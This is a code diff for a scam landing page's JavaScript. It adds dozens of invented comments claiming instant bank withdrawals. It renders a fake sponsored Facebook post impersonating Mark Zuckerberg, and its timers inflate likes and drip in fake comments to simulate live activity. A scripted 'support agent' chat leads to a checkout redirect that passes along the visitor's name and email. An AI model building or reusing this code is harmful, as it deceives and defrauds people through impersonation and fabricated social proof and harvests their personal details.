+    { name: "Mike Rodriguez", avatar: "images/comments/avatar_2.webp", text: "YESSS! Just received $520 in my account! This actually works! 🤑 💰", time: "3h", reactions: 226 },
+    { name: "Emily Chen", avatar: "images/comments/avatar_3.webp", text: "I'm shaking!! $425 just hit my bank account! Thank you so much!! 🙏 💸", time: "4h", reactions: 239 },
+    { name: "James Miller", avatar: "images/comments/avatar_4.webp", text: "NO WAY! $630 withdrawal successful! Best day ever! 🎊 💵", time: "5h", reactions: 252 },
+    { name: "Maria Santos", avatar: "images/comments/avatar_5.webp", text: "Just got $395! I'm crying tears of joy right now! 😭 ❤️", time: "6h", reactions: 265 },
+    { name: "David Kim", avatar: "images/comments/avatar_6.webp", text: "HOLY MOLY! $580 just arrived! This is insane! 🚀 💰", time: "7h", reactions: 278 },
+    { name: "Jessica Brown", avatar: "images/comments/avatar_7.webp", text: "I'm literally screaming! $445 in my account! THANK YOU! 🎉 🙌", time: "8h", reactions: 291 },
+    { name: "Carlos Garcia", avatar: "images/comments/avatar_8.webp", text: "BRO!! Just cashed out $715! My hands are shaking! 💪 🔥", time: "9h", reactions: 304 },
+    { name: "Amanda Wilson", avatar: "images/comments/avatar_9.webp", text: "OMG OMG! $505 withdrawal complete! I can't stop smiling! 😊 💕", time: "10h", reactions: 317 },
+    { name: "Robert Taylor", avatar: "images/comments/avatar_10.webp", text: "YOOO! $660 just dropped! This is absolutely crazy! 🎯 💸", time: "11h", reactions: 330 },
+    { name: "Lisa Anderson", avatar: "images/comments/avatar_11.webp", text: "I'm in shock! $415 received! This changed my life! ☀️ ✨", time: "12h", reactions: 343 },
+    { name: "Anthony Moore", avatar: "images/comments/avatar_12.webp", text: "LETS GOOO! $595 confirmed! Best decision I ever made! 🏆 💰", time: "13h", reactions: 356 },
+    { name: "Rachel Martinez", avatar: "images/comments/avatar_13.webp", text: "NO FREAKING WAY! $485 just hit! I'm so grateful! 🙏 💕", time: "14h", reactions: 369 },
+    { name: "Kevin Jackson", avatar: "images/comments/avatar_14.webp", text: "DUDE!! $725 withdrawal successful! Mind blown! 🤯 💵", time: "15h", reactions: 382 },
+    { name: "Natalie White", avatar: "images/comments/avatar_15.webp", text: "I can't believe it! $455 in my bank! Dreams do come true! ✨ 🎊", time: "16h", reactions: 395 }
+  ];
+
+  var EXTRA_FB_COMMENTS = [
+    { name: "Brandon Lee", avatar: "images/comments/extra_1.webp", text: "Just saw the funds in my Wells Fargo! $430 cleared instantly! 🔥", time: "Just now", reactions: 14 },
+    { name: "Stephanie Miller", avatar: "images/comments/extra_2.webp", text: "Followed the video step-by-step and it worked on the first try! $510 received! 😭 ❤️", time: "Just now", reactions: 22 },
+    { name: "Marcus Wright", avatar: "images/comments/extra_3.webp", text: "Bro Mark is the real MVP!! $680 cashout confirmed on my screen right now 🚀 💰", time: "Just now", reactions: 19 },
+    { name: "Chloe Bennett", avatar: "images/comments/extra_4.webp", text: "I was skeptical at first, but $390 literally just dropped into my account!! Thank you!! 🙌 ✨", time: "Just now", reactions: 31 },
+    { name: "Daniel Martinez", avatar: "images/comments/extra_5.webp", text: "FASTEST withdrawal of my life. 3 minutes and $475 was ready in my Chase account 💸", time: "Just now", reactions: 16 },
+    { name: "Hannah Scott", avatar: "images/comments/extra_6.webp", text: "My hands were shaking when the notification popped up: $560 received!! 🎉 🥳", time: "Just now", reactions: 27 },
+    { name: "Justin Taylor", avatar: "images/comments/extra_7.webp", text: "YESSS!! Direct deposit cleared for $620! Easiest money I've ever made in 2026 🤑", time: "Just now", reactions: 35 },
+    { name: "Ashley Adams", avatar: "images/comments/extra_8.webp", text: "Watching this video paid off!! $410 withdrawal approved and received! 💕 🙏", time: "Just now", reactions: 18 },
+    { name: "Tyler Robinson", avatar: "images/comments/extra_9.webp", text: "Instant transfer worked seamlessly! $740 in my balance! Absolutely legendary! 🤯 💵", time: "Just now", reactions: 42 },
+    { name: "Megan Harris", avatar: "images/comments/extra_10.webp", text: "Got my $495 right after entering my info! Thank you Facebook Rewards program! 🌸 ✨", time: "Just now", reactions: 24 },
+    { name: "Ryan Clark", avatar: "images/comments/extra_11.webp", text: "Can confirm this is 100% legit!! $530 just hit my credit union account! 🏆 💰", time: "Just now", reactions: 29 },
+    { name: "Brianna Lewis", avatar: "images/comments/extra_12.webp", text: "I literally cried happy tears! $460 paid my electric bill today!! God bless! 😭 ❤️", time: "Just now", reactions: 53 },
+    { name: "Jordan Walker", avatar: "images/comments/extra_13.webp", text: "BOOM! $690 received! Don't skip the tutorial guys, it shows everything! 🎯 💸", time: "Just now", reactions: 33 },
+    { name: "Amber Hall", avatar: "images/comments/extra_14.webp", text: "The tutorial made it so simple! Just took out $420 with zero issues! 😊 💕", time: "Just now", reactions: 21 },
+    { name: "Christian Young", avatar: "images/comments/extra_15.webp", text: "Man I never win anything, but $580 just landed in my bank account!! 🔥 🚀", time: "Just now", reactions: 38 },
+    { name: "Kayla King", avatar: "images/comments/extra_16.webp", text: "Just refreshed my banking app and $515 is ALREADY THERE! Screaming!! 🎉 😱", time: "Just now", reactions: 45 },
+    { name: "Austin Wright", avatar: "images/comments/extra_17.webp", text: "Legitimately blown away! $640 withdrawal done in under 5 minutes! 💵 💪", time: "Just now", reactions: 28 },
+    { name: "Victoria Green", avatar: "images/comments/extra_18.webp", text: "Thank you Zuck and team! $480 deposited directly to my debit card! 🙏 💖", time: "Just now", reactions: 36 },
+    { name: "Dylan Baker", avatar: "images/comments/extra_19.webp", text: "Just got the bank SMS: +$710! This program is an absolute blessing! ⚡ 💰", time: "Just now", reactions: 49 },
+    { name: "Samantha Nelson", avatar: "images/comments/extra_20.webp", text: "My sister and I both got ours! $550 in mine right now! Best day! 🎊 ☀️", time: "Just now", reactions: 58 },
+    { name: "Lucas Mitchell", avatar: "images/comments/extra_21.webp", text: "Done and dusted! $605 in my account balance! Follow the video instructions! 🚀", time: "Just now", reactions: 26 },
+    { name: "Olivia Perez", avatar: "images/comments/extra_22.webp", text: "I just got $440!! It took literally 2 minutes after watching! I'm in awe!! 😍 ✨", time: "Just now", reactions: 39 }
+  ];
+
+  var fbPostLikes = 2847;
+  var fbPostLiked = false;
+  var fbCommentsCount = 15;
+  var fbExtraCommentIndex = 0;
+  var postLikesTicker = null;
+  var dynamicCommentsTicker = null;
+  var randomReactionsTicker = null;
+
+  function formatFbNumber(num) {
+    return Number(num).toLocaleString('de-DE');
+  }
+
+  function toggleFbPostLike() {
+    var btn = document.getElementById("chat-fb-like-action");
+    var countEl = document.getElementById("chat-fb-likes-count");
+    if (!btn || !countEl) return;
+    fbPostLiked = !fbPostLiked;
+    if (fbPostLiked) {
+      btn.classList.add("liked");
+      fbPostLikes += 1;
+    } else {
+      btn.classList.remove("liked");
+      fbPostLikes = Math.max(0, fbPostLikes - 1);
+    }
+    countEl.textContent = formatFbNumber(fbPostLikes);
+  }
+
+  function toggleCommentLike(btn) {
+    if (!btn) return;
+    var isLiked = btn.classList.toggle("liked");
+    var pill = btn.parentElement.querySelector(".fb-comment-reactions-pill");
+    if (!pill) return;
+    var numEl = pill.querySelector(".fb-comment-rx-num");
+    var count = parseInt(pill.getAttribute("data-count") || (numEl ? numEl.textContent : "0"), 10) || 0;
+    if (isLiked) {
+      count += 1;
+      btn.textContent = "Liked";
+      pill.style.display = "inline-flex";
+    } else {
+      count = Math.max(0, count - 1);
+      btn.textContent = "Like";
+      if (count === 0 && pill.getAttribute("data-user-own") === "true") {
+        pill.style.display = "none";
+      }
+    }
+    pill.setAttribute("data-count", count);
+    if (numEl) numEl.textContent = count;
+    pill.classList.add("bump");
+    setTimeout(function() { pill.classList.remove("bump"); }, 300);
+  }
+
+  function focusFbCommentInput() {
+    var input = document.getElementById("chat-fb-comment-input");
+    var container = document.getElementById("chat-fb-comments-list");
+    if (input) {
+      if (container) container.scrollTop = container.scrollHeight;
+      input.focus();
+    }
+  }
+
+  function updateFbCommentsCounts() {
+    var cCount = document.getElementById("chat-fb-comments-count");
+    var rCount = document.getElementById("chat-fb-reviews-count");
+    if (cCount) cCount.textContent = fbCommentsCount + " comments";
+    if (rCount) rCount.textContent = fbCommentsCount + " verified reviews";
+  }
+
+  var commentTimesInterval = null;
+
+  function updateAllCommentTimes() {
+    var timeEls = document.querySelectorAll(".fb-comment-time[data-timestamp]");
+    if (!timeEls || timeEls.length === 0) return;
+    var now = Date.now();
+    timeEls.forEach(function(el) {
+      var ts = parseInt(el.getAttribute("data-timestamp"), 10);
+      if (!ts) return;
+      var diffSec = Math.floor((now - ts) / 1000);
+      if (diffSec < 45) {
+        el.textContent = "Just now";
+      } else if (diffSec < 3600) {
+        var m = Math.floor(diffSec / 60);
+        el.textContent = (m <= 0 ? 1 : m) + "m";
+      } else {
+        var h = Math.floor(diffSec / 3600);
+        el.textContent = h + "h";
+      }
+    });
+  }
+
+  function submitUserComment(e) {
+    if (e && e.preventDefault) e.preventDefault();
+    var input = document.getElementById("chat-fb-comment-input");
+    var list = document.getElementById("chat-fb-comments-list");
+    if (!input || !list) return;
+    var text = input.value.trim();
+    if (!text) return;
+
+    var name = supportName || "You";
+    var initial = (name.charAt(0) || "Y").toUpperCase();
+    var nowTs = Date.now();
+    var item = document.createElement("div");
+    item.className = "fb-comment-item new-in user-highlight";
+    item.innerHTML =
+      '<div class="fb-comment-avatar-user">' + escapeSupportText(initial) + '</div>' +
+      '<div class="fb-comment-content">' +
+        '<div class="fb-comment-bubble">' +
+          '<div class="fb-comment-author">' + escapeSupportText(name) + ' <span class="fb-comment-author-badge">Author</span></div>' +
+          '<div class="fb-comment-text">' + escapeSupportText(text) + '</div>' +
+        '</div>' +
+        '<div class="fb-comment-footer">' +
+          '<span class="fb-comment-time" data-timestamp="' + nowTs + '">Just now</span>' +
+          '<span class="fb-comment-like-btn" onclick="toggleCommentLike(this)">Like</span>' +
+          '<span class="fb-comment-reactions-pill" data-user-own="true" data-count="0" style="display:none">' +
+            '<span>❤️ 👍</span>' +
+            '<span class="fb-comment-rx-num">0</span>' +
+          '</span>' +
+        '</div>' +
+      '</div>';
+
+    list.appendChild(item);
+    input.value = "";
+    fbCommentsCount += 1;
+    updateFbCommentsCounts();
+    applyTwemoji(item);
+
+    setTimeout(function() {
+      list.scrollTo({ top: list.scrollHeight, behavior: 'smooth' });
+    }, 50);
+
+    // After 3.5 seconds, user comment receives a reaction!
+    setTimeout(function() {
+      var pill = item.querySelector(".fb-comment-reactions-pill");
+      var numEl = item.querySelector(".fb-comment-rx-num");
+      if (pill && numEl) {
+        pill.style.display = "inline-flex";
+        pill.setAttribute("data-count", "1");
+        numEl.textContent = "1";
+        pill.classList.add("bump");
+        setTimeout(function(){ pill.classList.remove("bump"); }, 300);
+      }
+    }, 3500);
+  }
+
+  function scheduleNextPostLike() {
+    var delay = Math.floor(Math.random() * 1200) + 1800; // 1.8s - 3.0s (~100 likes across 4min)
+    postLikesTicker = setTimeout(function() {
+      fbPostLikes += 1;
+      var countEl = document.getElementById("chat-fb-likes-count");
+      if (countEl) countEl.textContent = formatFbNumber(fbPostLikes);
+      scheduleNextPostLike();
+    }, delay);
+  }
+
+  function scheduleNextDynamicComment() {
+    if (fbExtraCommentIndex >= EXTRA_FB_COMMENTS.length) return;
+    var delay = Math.floor(Math.random() * 5000) + 8500; // 8.5s - 13.5s (22 comments across 4min)
+    dynamicCommentsTicker = setTimeout(function() {
+      addOneDynamicComment();
+      scheduleNextDynamicComment();
+    }, delay);
+  }
+
+  function addOneDynamicComment() {
+    if (fbExtraCommentIndex >= EXTRA_FB_COMMENTS.length) return;
+    var c = EXTRA_FB_COMMENTS[fbExtraCommentIndex++];
+    var list = document.getElementById("chat-fb-comments-list");
+    if (!list) return;
+
+    var nowTs = Date.now();
+    var item = document.createElement("div");
+    item.className = "fb-comment-item new-in";
+    item.innerHTML =
+      '<img class="fb-comment-avatar" src="' + c.avatar + '" alt="' + escapeSupportText(c.name) + '">' +
+      '<div class="fb-comment-content">' +
+        '<div class="fb-comment-bubble">' +
+          '<div class="fb-comment-author">' + escapeSupportText(c.name) + '</div>' +
+          '<div class="fb-comment-text">' + c.text + '</div>' +
+        '</div>' +
+        '<div class="fb-comment-footer">' +
+          '<span class="fb-comment-time" data-timestamp="' + nowTs + '">Just now</span>' +
+          '<span class="fb-comment-like-btn" onclick="toggleCommentLike(this)">Like</span>' +
+          '<span class="fb-comment-reactions-pill" data-count="' + c.reactions + '">' +
+            '<span>❤️ 👍 😲</span>' +
+            '<span class="fb-comment-rx-num">' + c.reactions + '</span>' +
+          '</span>' +
+        '</div>' +
+      '</div>';
+
+    list.appendChild(item);
+    fbCommentsCount += 1;
+    updateFbCommentsCounts();
+    applyTwemoji(item);
+
+    // If list is scrolled near the bottom, scroll smoothly so user sees incoming comments
+    var isNearBottom = (list.scrollHeight - list.scrollTop - list.clientHeight) < 140;
+    if (isNearBottom) {
+      list.scrollTo({ top: list.scrollHeight, behavior: 'smooth' });
+    }
+  }
+
+  function scheduleNextRandomReaction() {
+    var delay = Math.floor(Math.random() * 3500) + 4500; // 4.5s - 8s
+    randomReactionsTicker = setTimeout(function() {
+      bumpRandomCommentReaction();
+      scheduleNextRandomReaction();
+    }, delay);
+  }
+
+  function bumpRandomCommentReaction() {
+    var list = document.getElementById("chat-fb-comments-list");
+    if (!list) return;
+    var pills = list.querySelectorAll(".fb-comment-reactions-pill");
+    if (!pills || pills.length === 0) return;
+    var visiblePills = Array.prototype.filter.call(pills, function(p) {
+      return p.style.display !== "none";
+    });
+    if (visiblePills.length === 0) return;
+    var randIdx = Math.floor(Math.random() * visiblePills.length);
+    var pill = visiblePills[randIdx];
+    var numEl = pill.querySelector(".fb-comment-rx-num");
+    if (!numEl) return;
+    var cur = parseInt(pill.getAttribute("data-count") || numEl.textContent, 10) || 0;
+    var add = Math.random() > 0.4 ? 1 : 2;
+    cur += add;
+    pill.setAttribute("data-count", cur);
+    numEl.textContent = cur;
+    pill.classList.add("bump");
+    setTimeout(function() { pill.classList.remove("bump"); }, 300);
+  }
+
+  function addSupportFacebookPost(opts) {
+    var chat = document.getElementById("support-chat");
+    if (!chat) return;
+    supportTyping(false);
+
+    opts = opts || {};
+    var playerId = opts.id || "6abc96cf953cdb1ddef4ea63";
+    var padding = opts.padding || "125%";
+
+    if (!document.getElementById("converteai-sdk")) {
+      var s = document.createElement("script");
+      s.id = "converteai-sdk";
+      s.src = "https://scripts.converteai.net/lib/js/smartplayer-wc/v4/sdk.js";
+      s.async = true;
+      document.head.appendChild(s);
+    }
+
+    fetchPlayerPitchConfig(playerId);
+
+    var embedUrl = 'https://scripts.converteai.net/2223d7db-1826-46ab-bf08-708ee5b93e74/players/' + playerId + '/v4/embed.html' + (location.search || '?') + '&vl=' + encodeURIComponent(location.href);
+
+    var userInitial = (supportName ? supportName.charAt(0) : 'Y').toUpperCase();
+
+    var commentsHtml = FB_COMMENTS.map(function(c) {
+      return '<div class="fb-comment-item">' +
+        '<img class="fb-comment-avatar" src="' + c.avatar + '" alt="' + escapeSupportText(c.name) + '">' +
+        '<div class="fb-comment-content">' +
+          '<div class="fb-comment-bubble">' +
+            '<div class="fb-comment-author">' + escapeSupportText(c.name) + '</div>' +
+            '<div class="fb-comment-text">' + c.text + '</div>' +
+          '</div>' +
+          '<div class="fb-comment-footer">' +
+            '<span class="fb-comment-time">' + c.time + '</span>' +
+            '<span class="fb-comment-like-btn" onclick="toggleCommentLike(this)">Like</span>' +
+            '<span class="fb-comment-reactions-pill" data-count="' + c.reactions + '">' +
+              '<span>❤️ 👍 😲</span>' +
+              '<span class="fb-comment-rx-num">' + c.reactions + '</span>' +
+            '</span>' +
+          '</div>' +
+        '</div>' +
+      '</div>';
+    }).join('');
+
+    var row = document.createElement("div");
+    row.className = "support-row support-row-fbpost";
+    row.innerHTML = getAgentAvatarHtml() +
+      '<div class="chat-fb-post-wrapper">' +
+        '<article class="chat-fb-post">' +
+          '<div class="chat-fb-post-head">' +
+            '<div class="chat-fb-avatar"><img src="images/zuck.webp" alt="Mark Zuckerberg"></div>' +
+            '<div class="chat-fb-post-meta">' +
+              '<div class="chat-fb-post-name"><span>Mark Zuckerberg</span><img src="images/verified.png" alt="Verified"></div>' +
+              '<div class="chat-fb-sponsored"><span>Sponsored</span><span>·</span><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><path d="M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20"></path><path d="M2 12h20"></path></svg></div>' +
+            '</div>' +
+            '<button class="chat-fb-more" aria-label="More options"><svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><circle cx="5" cy="12" r="2"></circle><circle cx="12" cy="12" r="2"></circle><circle cx="19" cy="12" r="2"></circle></svg></button>' +
+          '</div>' +
+          '<div class="chat-fb-copy">Watch this 4-minute tutorial to learn how to register your bank account and withdraw your earnings. Step-by-step guide for instant withdrawals.</div>' +
+          '<div class="chat-fb-video-wrap">' +
+            '<div id="ifr_' + playerId + '_wrapper" style="margin: 0 auto; width: 100%;">' +
+              '<div style="position: relative; padding: ' + padding + ' 0 0 0;" id="ifr_' + playerId + '_aspect">' +
+                '<iframe frameborder="0" allowfullscreen allow="autoplay; fullscreen; encrypted-media" src="' + embedUrl + '" id="ifr_' + playerId + '" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: 0;" referrerpolicy="origin"></iframe>' +
+              '</div>' +
+            '</div>' +
+          '</div>' +
+          '<div class="chat-fb-stats">' +
+            '<div class="chat-fb-reactions">' +
+              '<div class="chat-fb-reaction-stack">' +
+                '<div class="chat-fb-reaction fb-rx-like"><svg width="10" height="10" viewBox="0 0 24 24" fill="white"><path d="M14 9V5a3 3 0 0 0-3-3l-4 9v11h11.28a2 2 0 0 0 2-1.7l1.38-9a2 2 0 0 0-2-2.3zM7 22H4a2 2 0 0 1-2-2v-7a2 2 0 0 1 2-2h3"></path></svg></div>' +
+                '<div class="chat-fb-reaction fb-rx-love"><svg width="9" height="9" viewBox="0 0 24 24" fill="white"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"></path></svg></div>' +
+              '</div>' +
+              '<span id="chat-fb-likes-count">' + formatFbNumber(fbPostLikes) + '</span>' +
+            '</div>' +
+            '<div class="chat-fb-stat-right"><span id="chat-fb-comments-count">' + fbCommentsCount + ' comments</span><span>·</span><span>145 shares</span></div>' +
+          '</div>' +
+          '<div class="chat-fb-actions">' +
+            '<button class="chat-fb-action" id="chat-fb-like-action" onclick="toggleFbPostLike()"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"><path d="M7 10v12"></path><path d="M15 5.88 14 10h5.83a2 2 0 0 1 1.92 2.56l-2.33 8A2 2 0 0 1 17.5 22H4a2 2 0 0 1-2-2v-8a2 2 0 0 1 2-2h2.76a2 2 0 0 0 1.79-1.11L12 2a3.13 3.13 0 0 1 3 3.88Z"></path></svg><span>Like</span></button>' +
+            '<button class="chat-fb-action" onclick="focusFbCommentInput()"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"><path d="M7.9 20A9 9 0 1 0 4 16.1L2 22Z"></path></svg><span>Comment</span></button>' +
+            '<button class="chat-fb-action"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"><circle cx="18" cy="5" r="3"></circle><circle cx="6" cy="12" r="3"></circle><circle cx="18" cy="19" r="3"></circle><line x1="8.59" x2="15.42" y1="13.51" y2="17.49"></line><line x1="15.41" x2="8.59" y1="6.51" y2="10.49"></line></svg><span>Share</span></button>' +
+          '</div>' +
+          '<div class="chat-fb-comments-bar">' +
+            '<span>Top comments</span><span id="chat-fb-reviews-count">' + fbCommentsCount + ' verified reviews</span>' +
+          '</div>' +
+          '<div class="chat-fb-comments" id="chat-fb-comments-list">' +
+            commentsHtml +
+          '</div>' +
+          '<form class="chat-fb-comment-form" onsubmit="submitUserComment(event)">' +
+            '<div class="fb-comment-avatar-user" id="chat-fb-user-avatar">' + escapeSupportText(userInitial) + '</div>' +
+            '<div class="chat-fb-input-box">' +
+              '<input type="text" id="chat-fb-comment-input" class="chat-fb-comment-input" placeholder="Write a comment..." maxlength="180" autocomplete="off">' +
+              '<button type="submit" class="chat-fb-comment-btn" aria-label="Send comment">' +
+                '<svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"/></svg>' +
+              '</button>' +
+            '</div>' +
+          '</form>' +
+        '</article>' +
+      '</div>';
+
+    chat.appendChild(row);
+
+    // Cria o marcador com a classe .smartplayer-scroll-event para o VTurb
+    var marker = document.createElement("div");
+    marker.className = "smartplayer-scroll-event";
+    marker.id = "smartplayer-scroll-marker-" + playerId;
+    marker.setAttribute("data-player-id", playerId);
+
+    var origGBCR = marker.getBoundingClientRect.bind(marker);
+    marker.getBoundingClientRect = function() {
+      advanceFromPitch(playerId);
+      return origGBCR();
+    };
+
+    chat.appendChild(marker);
+    applyTwemoji(row);
+    supportScroll();
+
+    // Inicia os tickers dinâmicos durante o vídeo
+    if (postLikesTicker) clearTimeout(postLikesTicker);
+    if (dynamicCommentsTicker) clearTimeout(dynamicCommentsTicker);
+    if (randomReactionsTicker) clearTimeout(randomReactionsTicker);
+    if (commentTimesInterval) clearInterval(commentTimesInterval);
+    commentTimesInterval = setInterval(updateAllCommentTimes, 3000);
+    updateAllCommentTimes();
+    scheduleNextPostLike();
+    scheduleNextDynamicComment();
+    scheduleNextRandomReaction();
   }
 
   function showSupportChoice(label) {
@@ -848,29 +1668,71 @@
   function runSupportStep() {
     if (supportIndex >= SUPPORT_STEPS.length) return;
     var step = SUPPORT_STEPS[supportIndex];
+    if (step.track) {
+      trackFunnelStep(step.track);
+    }
     if (step.type === "wait") {
       var next = SUPPORT_STEPS[supportIndex + 1];
-      if (next && (next.type === "text" || next.type === "eligibility")) supportTyping(true);
+      if (next && next.type === "text" && currentSupportAgent === "emily") {
+        var rawNext = typeof next.text === "function" ? next.text() : next.text;
+        rawNext = rawNext.replace(/\{name\}/g, supportName || "");
+        var dynamicMs = getTypingDelay(rawNext);
+        var pauseMs = 600;
+        supportIndex += 1;
+        setTimeout(function() {
+          supportTyping(true);
+          setTimeout(runSupportStep, dynamicMs);
+        }, pauseMs);
+        return;
+      }
+      if (next && next.type === "text") supportTyping(true);
       supportIndex += 1;
       setTimeout(runSupportStep, step.ms);
       return;
     }
-    if (step.type === "text") {
-      if (!step.noTyping) supportTyping(true);
-      setTimeout(function(){ addSupportBubble("agent", step.text); supportIndex += 1; runSupportStep(); }, step.noTyping ? 0 : 500);
+    if (step.type === "join") {
+      supportTyping(false);
+      addSupportSystemMessage(step.text);
+      supportIndex += 1;
+      setTimeout(function() {
+        currentSupportAgent = "emily";
+        updateSupportAgentCard("emily");
+        runSupportStep();
+      }, 700);
       return;
     }
-    if (step.type === "eligibility") {
-      if (!step.noTyping) supportTyping(true);
+    if (step.type === "text") {
+      var raw = typeof step.text === "function" ? step.text() : step.text;
+      var text = raw.replace(/\{name\}/g, escapeSupportText(supportName || ""));
+      var prev = supportIndex > 0 ? SUPPORT_STEPS[supportIndex - 1] : null;
+      var hadWait = prev && prev.type === "wait";
+
+      if (!hadWait && currentSupportAgent === "emily") {
+        supportTyping(true);
+        var delay = getTypingDelay(raw.replace(/\{name\}/g, supportName || ""));
+        setTimeout(function(){
+          addSupportBubble("agent", text);
+          supportIndex += 1;
+          runSupportStep();
+        }, delay);
+        return;
+      }
+
+      if (!hadWait) {
+        supportTyping(true);
+        setTimeout(function(){
+          addSupportBubble("agent", text);
+          supportIndex += 1;
+          runSupportStep();
+        }, 500);
+        return;
+      }
+
       setTimeout(function(){
-        addSupportBubble("agent", '<span class="support-eligibility"><span class="support-confirm-icon" aria-hidden="true">✓</span><span>Everything looks good, ' + escapeSupportText(supportName) + '!<br><br>I checked our system and saw that you are eligible to receive your commission of $278.45.</span></span>');
+        addSupportBubble("agent", text);
         supportIndex += 1;
         runSupportStep();
-      }, step.noTyping ? 0 : 500);
-      return;
-    }
-    if (step.type === "messageLoading") {
-      showSupportMessageLoading(step.ms);
+      }, 100);
       return;
     }
     if (step.type === "receipt") {
@@ -890,9 +1752,22 @@
       return;
     }
     if (step.type === "video") {
-      addSupportVideo();
-      supportIndex += 1;
-      setTimeout(runSupportStep, 200);
+      var playerId = step.id || "6abd374d673e2b44981dc239";
+      waitingVideoPitch = playerId;
+      addSupportVideo(step);
+      // Pausa e aguarda o pitch configurado no VTurb!
+      return;
+    }
+    if (step.type === "fbPost") {
+      var playerId = step.id || "6abc96cf953cdb1ddef4ea63";
+      waitingVideoPitch = playerId;
+      addSupportFacebookPost(step);
+      // No ambiente de dev (URL contendo "dev", ex: ?devStep=4), pula o tempo de espera do vídeo 2
+      if (location.href.toLowerCase().indexOf("dev") !== -1) {
+        setTimeout(function() {
+          advanceFromPitch(playerId);
+        }, 2500);
+      }
       return;
     }
     if (step.type === "input") {
@@ -900,8 +1775,9 @@
       return;
     }
     if (step.type === "choice") showSupportChoice(step.label);
-    if (step.type === "demoEnd") {
-      openDemoEnd();
+    if (step.type === "checkout") {
+      if (typeof window.b3Step === "function") window.b3Step("checkout");
+      openCheckout();
     }
   }
 
@@ -913,7 +1789,8 @@
     addSupportBubble("user", label);
     supportIndex += 1;
     if (supportIndex >= SUPPORT_STEPS.length) {
-      openDemoEnd();
+      if (typeof window.b3Step === "function") window.b3Step("checkout");
+      openCheckout();
       return;
     }
     setTimeout(runSupportStep, 300);
@@ -928,17 +1805,38 @@
     if (supportInputKind === "email") supportEmail = value;
     document.getElementById("support-form").classList.remove("visible");
     addSupportBubble("user", escapeSupportText(value));
+    trackFunnelStep("dados");
     supportInputKind = null;
     supportIndex += 1;
     setTimeout(runSupportStep, 300);
   }
 
-  // ─── Demo ending ──────────────────────────────────────────────────────────────
-  function openDemoEnd() {
-    document.getElementById("modal-demo-end").classList.add("open");
+  // ─── Checkout Redirect ────────────────────────────────────────────────────────
+  function openCheckout() {
+    redirectToCheckout();
   }
-  function closeDemoEnd() {
-    document.getElementById("modal-demo-end").classList.remove("open");
+
+  function redirectToCheckout() {
+    var params = new URLSearchParams(window.location.search);
+    try {
+      var url = new URL(CHECKOUT_URL);
+      params.forEach(function(v, k) { url.searchParams.set(k, v); });
+      if (supportName) url.searchParams.set("name", supportName);
+      if (supportEmail) url.searchParams.set("email", supportEmail);
+      window.location.href = url.toString();
+    } catch(err) {
+      window.location.href = CHECKOUT_URL;
+    }
+  }
+
+  function closeCheckout() {
+    var modal = document.getElementById("modal-checkout");
+    if (modal) modal.classList.remove("open");
+  }
+
+  function submitCheckout(e) {
+    if (e && e.preventDefault) e.preventDefault();
+    redirectToCheckout();
   }
 
   // ─── Init ─────────────────────────────────────────────────────────────────────
